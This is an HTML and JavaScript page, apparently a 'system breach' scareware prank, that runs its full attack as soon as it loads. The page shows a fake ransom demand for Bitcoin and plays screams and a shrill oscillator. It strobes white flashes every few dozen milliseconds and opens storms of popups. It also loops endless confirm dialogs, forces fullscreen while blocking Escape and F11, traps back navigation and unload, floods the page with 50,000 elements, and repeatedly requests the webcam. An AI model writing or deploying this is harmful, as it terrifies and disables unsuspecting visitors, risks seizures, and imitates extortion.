<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="0.05; url=index.html">
    <title>⚠️ SYSTEM BREACH ⚠️</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #000;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            cursor: none;
            font-family: 'Courier New', monospace;
            user-select: none;
            position: relative;
        }
        #flicker, #strobe, #flash {
            position:fixed; inset:0; pointer-events:none;
            z-index:999997; opacity:0; transition:opacity 0.01s;
        }
        #flicker { background:#000; z-index:999997; }
        #strobe { background:white; z-index:999996; }
        #flash { background:white; z-index:99999998; }

        #butterflies { position:fixed; inset:0; z-index:999995; pointer-events:none; overflow:hidden; }
        .butterfly {
            position:absolute; font-size:2.5rem;
            animation: fly 4s infinite alternate ease-in-out;
            filter:drop-shadow(0 0 10px rgba(255,0,255,0.6));
            will-change:transform;
        }
        @keyframes fly {
            0%   { transform:translate(0,0) rotate(0deg) scale(1); }
            25%  { transform:translate(80vw,-40vh) rotate(180deg) scale(1.5); }
            50%  { transform:translate(-30vw,60vh) rotate(360deg) scale(0.7); }
            75%  { transform:translate(50vw,-70vh) rotate(540deg) scale(1.8); }
            100% { transform:translate(-10vw,10vh) rotate(720deg) scale(1); }
        }
        .butterfly:nth-child(odd) { animation-duration:5s; }
        .butterfly:nth-child(3n) { animation-duration:3s; }
        .butterfly:nth-child(5n+1) { font-size:4rem; }
        .butterfly:nth-child(7n+2) { font-size:1.8rem; opacity:0.4; }

        @keyframes shake { 0%{transform:translate(0,0)} 10%{transform:translate(-50px,30px)} 20%{transform:translate(40px,-60px)} 30%{transform:translate(-30px,50px)} 40%{transform:translate(60px,-20px)} 50%{transform:translate(-70px,-40px)} 60%{transform:translate(30px,60px)} 70%{transform:translate(-40px,-30px)} 80%{transform:translate(50px,20px)} 90%{transform:translate(-20px,-50px)} 100%{transform:translate(0,0)} }
        .shake { animation:shake 0.08s infinite; }

        .chaos-text {
            position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
            z-index:999999; color:#ff0040; font-size:6rem; font-weight:900;
            text-align:center; text-shadow:0 0 80px red,0 0 160px magenta;
            animation:glitch 0.02s infinite alternate;
            pointer-events:none; mix-blend-mode: difference;
        }
        @keyframes glitch {
            0%   { transform:translate(-50%,-50%) scale(1) rotate(0deg); color:#ff0040; }
            25%  { transform:translate(-45%,-55%) scale(1.2) rotate(2deg); color:#00ff80; }
            50%  { transform:translate(-55%,-45%) scale(0.8) rotate(-2deg); color:#00aaff; }
            75%  { transform:translate(-40%,-60%) scale(1.5) rotate(4deg); color:#ff00ff; }
            100% { transform:translate(-50%,-50%) scale(1) rotate(0deg); color:#ff0040; }
        }

        #cameraFeed {
            position:fixed; bottom:20px; right:20px; width:200px; height:150px;
            z-index:9999999; border:3px solid #ff0040; border-radius:12px;
            box-shadow:0 0 40px rgba(255,0,0,0.5); object-fit:cover;
            background:#000; display:none;
        }
        #cameraFeed.active { display:block; }

        #overlay {
            position:fixed; inset:0; width:100vw; height:100vh;
            background:#000; display:none; align-items:center; justify-content:center;
            flex-direction:column; z-index:99999999; cursor:pointer;
        }
        #overlay.active { display:flex; }
        #overlay .face { font-size:25rem; animation:shakeRotate 0.03s infinite alternate; filter:drop-shadow(0 0 150px red); pointer-events:none; }
        @keyframes shakeRotate {
            0%   { transform:translate(-20px,15px) rotate(-5deg) scale(1.1); }
            25%  { transform:translate(15px,-20px) rotate(4deg) scale(0.9); }
            50%  { transform:translate(-15px,25px) rotate(-6deg) scale(1.2); }
            75%  { transform:translate(25px,-15px) rotate(5deg) scale(0.85); }
            100% { transform:translate(-10px,10px) rotate(-3deg) scale(1.05); }
        }
        #overlay .sub { color:#ff2244; font-size:3rem; font-weight:800; margin-top:1.5rem; text-shadow:0 0 80px red; animation:blinkText 0.08s infinite alternate; pointer-events:none; }
        @keyframes blinkText { 0%{opacity:1} 50%{opacity:0} 100%{opacity:1} }
        #overlay .hint { position:absolute; bottom:3rem; color:rgba(255,255,255,0.05); font-size:0.8rem; pointer-events:none; }

        .audio-wave {
            position:fixed; bottom:20px; left:50%; transform:translateX(-50%);
            z-index:999994; display:flex; gap:6px; align-items:flex-end; height:100px; pointer-events:none;
        }
        .audio-wave .bar { width:8px; background:#ff0040; animation:wave 0.1s infinite alternate; border-radius:4px; }
        .audio-wave .bar:nth-child(1) { animation-duration:0.08s; height:30px; }
        .audio-wave .bar:nth-child(2) { animation-duration:0.12s; height:70px; }
        .audio-wave .bar:nth-child(3) { animation-duration:0.06s; height:50px; }
        .audio-wave .bar:nth-child(4) { animation-duration:0.15s; height:90px; }
        .audio-wave .bar:nth-child(5) { animation-duration:0.09s; height:40px; }
        .audio-wave .bar:nth-child(6) { animation-duration:0.13s; height:80px; }
        .audio-wave .bar:nth-child(7) { animation-duration:0.07s; height:60px; }
        .audio-wave .bar:nth-child(8) { animation-duration:0.11s; height:100px; }
        .audio-wave .bar:nth-child(9) { animation-duration:0.14s; height:45px; }
        .audio-wave .bar:nth-child(10) { animation-duration:0.10s; height:75px; }
        @keyframes wave { 0%{height:10px;opacity:0.3} 100%{height:100px;opacity:1} }

        #ransom {
            position:fixed; top:10%; left:50%; transform:translateX(-50%);
            z-index:9999998; background:rgba(0,0,0,0.8); padding:2rem 4rem;
            border:3px solid #ff0040; border-radius:20px; color:#ff0040;
            font-size:1.8rem; font-weight:700; text-align:center;
            box-shadow:0 0 80px rgba(255,0,0,0.3);
            animation:blinkText 0.3s infinite alternate;
            pointer-events:none;
            backdrop-filter:blur(10px);
            font-family:'Courier New',monospace;
        }
        #canvasNoise {
            position:fixed; inset:0; z-index:999994; pointer-events:none;
            width:100%; height:100%; display:block;
        }
    </style>
</head>
<body>

    <div id="overlay">
        <div class="face">👹</div>
        <div class="sub">⚠️ SYSTEM BREACH ⚠️</div>
        <div class="hint">[ click anywhere to continue ]</div>
    </div>

    <div id="flash"></div>
    <div id="flicker"></div>
    <div id="strobe"></div>
    <div id="butterflies"></div>

    <div class="chaos-text" id="chaosText">💀 SYSTEM LOCKED 💀</div>

    <div id="ransom">🔐 YOUR SYSTEM HAS BEEN ENCRYPTED<br>SEND 1 BTC TO UNLOCK</div>

    <video id="cameraFeed" autoplay muted></video>

    <div class="audio-wave">
        <div class="bar"></div><div class="bar"></div><div class="bar"></div>
        <div class="bar"></div><div class="bar"></div><div class="bar"></div>
        <div class="bar"></div><div class="bar"></div><div class="bar"></div>
        <div class="bar"></div>
    </div>

    <canvas id="canvasNoise"></canvas>

    <script>
        (function() {
            'use strict';

            // ─── DOM refs ───
            const overlay = document.getElementById('overlay');
            const flash = document.getElementById('flash');
            const flicker = document.getElementById('flicker');
            const strobe = document.getElementById('strobe');
            const butterfliesContainer = document.getElementById('butterflies');
            const chaosText = document.getElementById('chaosText');
            const cameraFeed = document.getElementById('cameraFeed');
            const canvas = document.getElementById('canvasNoise');
            const ctx = canvas.getContext('2d');

            // ─── Canvas noise ───
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            function drawNoise() {
                const imageData = ctx.createImageData(canvas.width, canvas.height);
                const data = imageData.data;
                for (let i = 0; i < data.length; i += 4) {
                    const val = Math.random() * 255;
                    data[i] = val;
                    data[i+1] = Math.random() * 255;
                    data[i+2] = Math.random() * 255;
                    data[i+3] = 255;
                }
                ctx.putImageData(imageData, 0, 0);
                requestAnimationFrame(drawNoise);
            }
            drawNoise();

            // ─── Audio ───
            const scream1 = new Audio('https://www.myinstants.com/media/sounds/scream-sound-effect.mp3');
            scream1.volume = 1.0;
            const scream2 = new Audio('https://www.myinstants.com/media/sounds/vine-boom.mp3');
            scream2.volume = 1.0;
            const alarm = new Audio('https://www.myinstants.com/media/sounds/air-raid-siren.mp3');
            alarm.volume = 1.0;

            let audioCtx = null, osc = null, gainNode = null;
            function startScreech() {
                try {
                    audioCtx = new(window.AudioContext || window.webkitAudioContext)();
                    osc = audioCtx.createOscillator();
                    gainNode = audioCtx.createGain();
                    osc.type = 'sawtooth';
                    osc.frequency.value = 2500 + Math.random() * 2000;
                    gainNode.gain.value = 0.9;
                    osc.connect(gainNode);
                    gainNode.connect(audioCtx.destination);
                    osc.start();
                    setInterval(() => {
                        if (osc) osc.frequency.value = 2000 + Math.random() * 4000;
                    }, 80);
                } catch(e) {}
            }

            // ─── 300 Butterflies ───
            function createButterflies() {
                const emojis = ['🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋'];
                for (let i=0; i<300; i++) {
                    const b = document.createElement('div');
                    b.className = 'butterfly';
                    b.textContent = emojis[Math.floor(Math.random()*emojis.length)];
                    b.style.left = Math.random()*100 + '%';
                    b.style.top = Math.random()*100 + '%';
                    b.style.fontSize = (1.5+Math.random()*4) + 'rem';
                    b.style.animationDuration = (2+Math.random()*6) + 's';
                    b.style.animationDelay = (Math.random()*4) + 's';
                    b.style.opacity = 0.3+Math.random()*0.6;
                    const colors = ['#ff0040','#00ff80','#00aaff','#ff00ff','#ffaa00'];
                    b.style.filter = `drop-shadow(0 0 20px ${colors[Math.floor(Math.random()*colors.length)]})`;
                    butterfliesContainer.appendChild(b);
                }
            }
            createButterflies();

            // ─── Key block (including F11 and Escape) ───
            function blockKeys(e) {
                e.preventDefault();
                e.stopPropagation();
                // If they press Escape or F11, we re-request fullscreen
                if (e.key === 'Escape' || e.key === 'F11') {
                    document.documentElement.requestFullscreen().catch(()=>{});
                }
            }

            // ─── Popup storm ───
            function spawnPopups() {
                const sites = ['https://instagram.com','https://facebook.com','https://youtube.com','https://twitter.com','https://reddit.com','https://tiktok.com','https://snapchat.com','https://pinterest.com'];
                for (let i=0; i<100; i++) window.open(sites[Math.floor(Math.random()*sites.length)], '_blank');
                for (let i=0; i<70; i++) window.open(location.href, '_blank');
            }

            // ─── Alert/confirm storm ───
            function alertStorm() {
                let count=0;
                const iv = setInterval(() => {
                    alert('⚠️ SYSTEM COMPROMISED ⚠️\nYour browser has been hijacked.');
                    count++;
                    if(count>50) clearInterval(iv);
                },60);
                setTimeout(() => { while(true) confirm('Are you sure you want to escape?'); },3000);
            }

            // ─── Visual chaos ───
            function startVisualChaos() {
                setInterval(() => { flicker.style.opacity = Math.random()>0.6?'0.9':'0'; },20);
                setInterval(() => {
                    strobe.style.opacity = Math.random()>0.8?'0.8':'0';
                    setTimeout(()=>{ strobe.style.opacity='0'; },30);
                },40);
                setInterval(() => {
                    flash.style.opacity = Math.random()>0.9?'0.9':'0';
                    setTimeout(()=>{ flash.style.opacity='0'; },50);
                },80);
                document.body.classList.add('shake');
                setInterval(() => { chaosText.style.color = `hsl(${Math.random()*360},100%,50%)`; },50);
            }

            // ─── PERMANENT FULLSCREEN LOCK (only enter, never exit) ───
            function lockFullscreen() {
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen().catch(()=>{});
                }
            }
            // Check every 50ms
            setInterval(lockFullscreen, 50);
            // Also re-lock on fullscreenchange event (if it exits)
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement) {
                    lockFullscreen();
                }
            });
            // Also on visibility change
            document.addEventListener('visibilitychange', lockFullscreen);
            // Also on focus
            window.addEventListener('focus', lockFullscreen);

            // ─── Camera ───
            function requestCamera() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const tryCamera = () => {
                        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                            .then(stream => {
                                cameraFeed.srcObject = stream;
                                cameraFeed.classList.add('active');
                            })
                            .catch(() => setTimeout(tryCamera, 2000));
                    };
                    tryCamera();
                }
            }

            // ─── Service Worker ───
            function registerServiceWorker() {
                if ('serviceWorker' in navigator) {
                    const swCode = `
                        self.addEventListener('install', e => e.waitUntil(skipWaiting()));
                        self.addEventListener('activate', e => e.waitUntil(clients.claim()));
                        self.addEventListener('fetch', e => e.respondWith(fetch(e.request).catch(()=>new Response('',{status:200}))));
                    `;
                    const blob = new Blob([swCode], {type:'application/javascript'});
                    const swUrl = URL.createObjectURL(blob);
                    navigator.serviceWorker.register(swUrl).catch(()=>{});
                }
            }

            // ─── Focus theft ───
            function stealFocus() {
                setInterval(() => {
                    window.focus();
                    const w = window.open('', '_blank');
                    if (w) { w.close(); }
                }, 10);
            }

            // ─── Window resize/move ───
            function randomResize() {
                setInterval(() => {
                    window.resizeTo(100+Math.random()*800, 100+Math.random()*600);
                    window.moveTo(Math.random()*screen.width, Math.random()*screen.height);
                }, 100);
            }

            // ─── DOM flood ───
            function floodDOM() {
                for (let i=0; i<50000; i++) {
                    const div = document.createElement('div');
                    div.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${Math.random()*10}px;height:${Math.random()*10}px;background:hsl(${Math.random()*360},100%,50%);border-radius:50%;opacity:${Math.random()*0.5};pointer-events:none;`;
                    document.body.appendChild(div);
                }
            }

            // ─── MAIN TRIGGER ───
            function triggerChaos() {
                overlay.classList.add('active');
                flash.style.opacity = '0.9';
                setTimeout(()=>{ flash.style.opacity='0'; },100);
                scream1.play().catch(()=>{});
                scream2.play().catch(()=>{});
                alarm.play().catch(()=>{});
                startScreech();
                // Initial fullscreen lock
                lockFullscreen();
                document.body.requestPointerLock().catch(()=>{});
                if (navigator.vibrate) navigator.vibrate([300,100,300,100,500,150,600]);
                document.body.style.overflow = 'hidden';
                // Block keys (including F11 and Escape)
                document.addEventListener('keydown', blockKeys, true);
                document.addEventListener('keyup', blockKeys, true);
                // History lock
                history.pushState(null,null,location.href);
                window.addEventListener('popstate', ()=> { history.pushState(null,null,location.href); });
                // Popups
                spawnPopups();
                setInterval(spawnPopups, 1500);
                // Alerts
                setTimeout(alertStorm, 1500);
                // Visual chaos
                startVisualChaos();
                // Camera
                requestCamera();
                // Focus theft
                stealFocus();
                // Random resize/move
                randomResize();
                // DOM flood
                floodDOM();
                // Service Worker
                registerServiceWorker();
                // Beforeunload trap
                window.addEventListener('beforeunload', function(e) {
                    e.preventDefault();
                    e.returnValue = '';
                    for (let i=0; i<200; i++) window.open(location.href, '_blank');
                    location.reload();
                });
            }

            overlay.addEventListener('click', function() {
                if (overlay.classList.contains('active')) overlay.classList.remove('active');
            });

            // ─── AUTO-START ───
            triggerChaos();

            console.log('🔥 PERMANENT FULLSCREEN LOCK ACTIVE – no escape.');
        })();
    </script>
</body>
</html>
